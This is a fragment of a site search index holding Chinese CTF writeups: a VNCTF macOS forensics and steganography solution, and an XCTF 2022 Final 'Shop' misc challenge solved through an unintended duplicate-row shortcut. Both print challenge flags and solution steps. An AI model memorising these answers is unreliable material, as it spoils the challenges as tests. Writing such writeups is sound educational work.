\u53d6\u8bc1\uff0c\u7ed9\u7684\u538b\u7f29\u5305\u662f System \u548c Users \u6587\u4ef6\u5939\u7684\u4e00\u90e8\u5206 \u5168\u5c40\u641c\u7d22 flag\uff0c\u53d1\u73b0 /Users/scr1pt/Librarys/Mail/V9/.../[Gmail].mbox/\u5df2\u5220\u9664\u90ae\u4ef6.mbox/ \u4e2d\u6709\u4e00\u4e2a 603.emlx \u6587\u4ef6\uff0c\u662f\u4e00\u5c01\u5220\u9664\u6389\u7684\u90ae\u4ef6</p> <p>\u7528 mac \u90ae\u4ef6\u5ba2\u6237\u7aef\u5c31\u80fd\u76f4\u63a5\u6253\u5f00\uff1a </p> <p>\u7136\u540e\u53bb\u627e\u8bf4\u7684 profile picture\uff0c\u53d1\u73b0\u6709\u4e09\u4e2a\u6587\u4ef6\u91cc\u6709\u7c7b\u4f3c\u56fe\u7247\u7684 base64: <pre><code>/System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/var/db/CryptoUserInfo.plist\n/System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/System/Library/Caches/com.apple.corestorage/EncryptedRoot.plist.wipekey\n/System/Volumes/Preboot/79FABCCE-3636-4266-A6CF-8E3BB40332B4/var/db/AllUsersInfo.plist\n</code></pre> \u7b2c\u4e00\u4e2a\u662f\u82b1\u56ed\u5b9d\u5b9d\u7684\u4e00\u4e2a\u89d2\u8272 jpeg \u56fe\u7247\uff0c\u7b2c\u4e8c\u4e2a\u662f\u4e00\u6735\u8377\u82b1\u7684 tiff \u56fe\u7247\uff0c\u7b2c\u4e09\u4e2a\u662f\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u89e3\u538b\u4e4b\u540e\u6709\u4e00\u5806\u8377\u82b1\u56fe\u7247\u7684\u4e0d\u540c\u6837\u5f0f\uff08\u5927\u5c0f\u8fb9\u6846\u6587\u5b57\u4e4b\u7c7b\uff09</p> <p>\u7136\u540e\u6211\u5c31\u53bb\u770b\u90a3\u4e2a tiff \u4e86\uff0c\u4ec0\u4e48\u90fd\u770b\u4e0d\u51fa\u6765</p> <p>\u770b\u4e86 wp\uff0c\u662f\u5728\u7b2c\u4e00\u4e2a\u56fe\u7247\u4e2d\u9690\u85cf\u7684\u4fe1\u606f \u6587\u4ef6\u672b\u5c3e\u6709\u4e00\u4e32 flag \u7684\u7ed3\u5c3e <code>nsllc_1s_s1MMple}</code>\uff08\u4e0d\u592a\u786e\u5b9a\uff09</p> <p>\u7136\u540e\u518d\u53bb\u6389\u8fd9\u4e00\u4e32\uff0c\u653e\u5230 Our Secret \u4e2d\u8bfb\u53d6\uff0c\u5f31\u5bc6\u7801 123456\uff0c\u5f97\u5230\u524d\u534a\u90e8\u5206 flag: <code>VNCTF{Macos_Fore</code></p>"},{"location":"writeups/xctf2022final/","title":"XCTF 2022 Final Writeup","text":"<p> \u7ea6 506 \u4e2a\u5b57  29 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u53ea\u505a\u4e86\u4e00\u9053 misc\uff0c\u86ee\u8c1c\u8bed\u7684\uff0c\u8fd8\u975e\u9884\u671f\u4e86</p>"},{"location":"writeups/xctf2022final/#shop","title":"Shop","text":"<p>\u53ea\u6709 nc\uff0c\u5927\u6982\u7387\u7eaf\u731c\u8c1c\uff0c\u8fde\u63a5\u4e0a\u8981\u6c42\u8f93\u5165\u7528\u6237\u540d\uff0c\u4e4b\u540e\uff1a</p> <pre><code>What would you like to buy? TonyCrane\n\n    These are what you can buy.\n    no.0 1da price: 10\n    no.1 apple price: 2\n    no.2 f1ag price: 1999\n    no.3 banana price: 1\n    no.4 xctf price: 5\n    no.5 b3rpsu1t price: 3\n    no.6 0l0_3ider price: 108\n\nHow about some ('no.1 apple', 2) ?\nPlease input your good number:\n</code></pre> <p>\u76f4\u63a5\u9009 2 flag \u4f1a Please earn more!\uff0c\u4e00\u76f4\u9009 3 \u6216\u8005\u5176\u4ed6\u65b9\u6cd5\u90fd\u53ef\u4ee5\u5f97\u5230\u521d\u59cb\u7684\u603b\u91d1\u989d\u662f 120\u3002</p> <p>\u5728\u4e00\u76f4\u4e70 0 \u7684\u65f6\u5019\u7b2c\u516d\u5929\u4f1a\u5f97\u5230 You eat too much 1da! What about trying something other? \u7136\u540e\u7ee7\u7eed\u9009 0 \uff0c\u7b2c\u5341\u6b21\u53ef\u4ee5\u5f97\u5230 You eat too much 1da and You triggered the hidden task: Get membership!</p> <p>\u6240\u4ee5\u8fd9\u65f6\u5c31\u89e6\u53d1\u4e86\u4e0b\u4e00\u4e2a\u4efb\u52a1\u4e5f\u5c31\u662f\u62ff\u5230\u4f1a\u5458\u3002\uff08\u5176\u5b9e\u8fd9\u91cc\u6709\u6697\u793a\u4f46\u5f53\u65f6\u6ca1\u6ce8\u610f\uff0c\u6700\u5f00\u5934\u8981\u6c42\u8f93\u5165\u7528\u6237\u540d\u7684\u65f6\u5019\u544a\u8bc9\u4e86\u4e0d\u80fd\u662f admin\uff0c\u4e5f\u4e0d\u80fd\u8fc7\u957f\uff0c\u5b9e\u9645\u4e0a\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\u90fd\u4f1a\u6539\u4e3a Bob\uff0c\u5e76\u4e14\u8f93\u51fa\u4e00\u53e5\u201cDo not eat too much 1da!!!\u201d\u4f5c\u4e3a\u63d0\u793a\uff09</p> <p>\u7ecf\u8fc7\u591a\u79cd\u5c1d\u8bd5\u53ef\u4ee5\u77e5\u9053\u4ece\u8f93\u5165\u5f97\u5230\u9009\u9879\u7684\u505a\u6cd5\u662f\u53d6\u8f93\u5165\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6570\u5b57\u5b57\u7b26\uff0c\u800c\u4e14\u5982\u679c\u8d85\u8fc7 6 \u6216\u8005\u6839\u672c\u6ca1\u6709\u6570\u5b57\uff0c\u4f1a\u8f93\u51fa What? Sorry, you can not buy anything today. This may affect your membership(A **month** of continuous shopping)</p> <p>\u6240\u4ee5\u5927\u6982\u731c\u6d4b\u4f1a\u5458\u8981\u4e00\u4e2a\u6708\u624d\u80fd\u5f97\u5230\uff0c\u8fd9\u6837\u7684\u8bdd\u9009 10 \u6b21 0 \u89e6\u53d1\u4efb\u52a1\uff0c\u7136\u540e\u5269\u4e0b\u7684\u94b1\u6b63\u597d\u591f\u9009 20 \u6b21 3\uff0c\u8fd9\u6837 30 \u5929\u4e4b\u540e\u5c31\u62ff\u5230\u4f1a\u5458\u4e86\uff1a</p> <pre><code>Thanks!\nDear Membership TonyCrane\nI will show you my Recommendation system. It contains A super AI and I test it myself!\nBut before I show that, what about a easy game?\nYour answer is(Y/N):\n</code></pre> <p>\u8fd9\u91cc\u56de\u7b54\u662f Y/N \u90fd\u662f\u4e00\u6837\u7684\uff0c\u4f1a\u8ba9\u4f60\u53bb\u89e3\u4e00\u9053\u9898\u76ee\uff1a</p> <pre><code>Here is the game, please find my score(integer) to those goods which have 0 score:\n\nbeginmatrix\n[[27, 0, 20, 0, 11, 0, 31, 23, 10, 0, 0, 15, 0, 13], [26, 32, 21, 7, 15, 18, 32, 26, 13, 25, 22, 13, 13, 14], [40, 46, 39, 11, 27, 24, 46, 28, 23, 41, 32, 29, 35, 28], [23, 27, 17, 6, 10, 15, 27, 21, 9, 20, 21, 12, 15, 11], [35, 40, 25, 9, 13, 22, 40, 30, 12, 29, 33, 19, 26, 16], [42, 49, 32, 11, 19, 27, 49, 37, 17, 37, 38, 23, 29, 21], [43, 52, 42, 12, 32, 28, 52, 36, 27, 46, 33, 28, 29, 30], [30, 35, 25, 8, 16, 19, 35, 25, 14, 28, 26, 18, 22, 17]]\nendmatirx\nwhere row stand for user and col stand for goods\nThe good and user embedding dim are both 3!\nThe flag is md5(first row)\nExample: if the first row is [14 13  9 22 20 25 14 27 20 15 19 10 32 21] md5(141392220251427201519103221)==59d25d2c3cc2bb1d27f550329d35f5a5\nSo, the answer is 59d25d2c3cc2bb1d27f550329d35f5a5\nNow, what is your answer?\n</code></pre> <p>\u770b\u8d77\u6765\u548c AI \u4ee5\u53ca\u63a8\u8350\u7b97\u6cd5\u6709\u5173\uff0c\u641c\u4e86\u597d\u591a\u4e5f\u6ca1\u627e\u5230\uff0c\u5199\u4e0d\u51fa\u6765\u3002</p> <p>\u7136\u540e\u5728\u4e00\u6b21\u6b21\u5c1d\u8bd5\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u975e\u9884\u671f\uff08\u5927\u6982\u4e5f\u662f\u5f88\u591a\u961f\u505a\u51fa\u6765\u7684\u539f\u56e0\uff09\uff0c\u5728\u8fd9\u4e2a\u8f93\u51fa\u7684\u77e9\u9635\u4e2d\uff0c\u6709\u4e00\u5b9a\u6982\u7387\u4f1a\u51fa\u73b0\u4e24\u884c\u4e00\u6837\u7684\u60c5\u51b5\uff0c\u4e5f\u5c31\u662f\u6709\u53ef\u80fd\u4f1a\u51fa\u73b0\u548c\u539f\u672c\u7b2c\u4e00\u884c\u4e00\u6837\u7684\u884c\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7b54\u6848\u5c31\u76f4\u63a5\u6253\u51fa\u6765\u4e86\uff0cmd5 \u4e00\u4e0b\u4ea4\u4e0a\u53bb\u5c31\u53ef\u4ee5\u4e86\uff0c\u5f97\u5230 flag: flag{a2b035c8_congratulations+7618=on=528f1b1_solving_this&gt;814464a4c6812&lt;problem:D}</p> <p>\u9884\u671f\u5c31\u662f AI \u76f8\u5173\u7684\u63a8\u8350\u7cfb\u7edf\u77e9\u9635\u5206\u89e3\u7b97\u6cd5\uff0c\u6559\u7a0b\uff1ahttps://blog.csdn.net/weixin_43164078/article/details/124278175\u3002</p>"}]}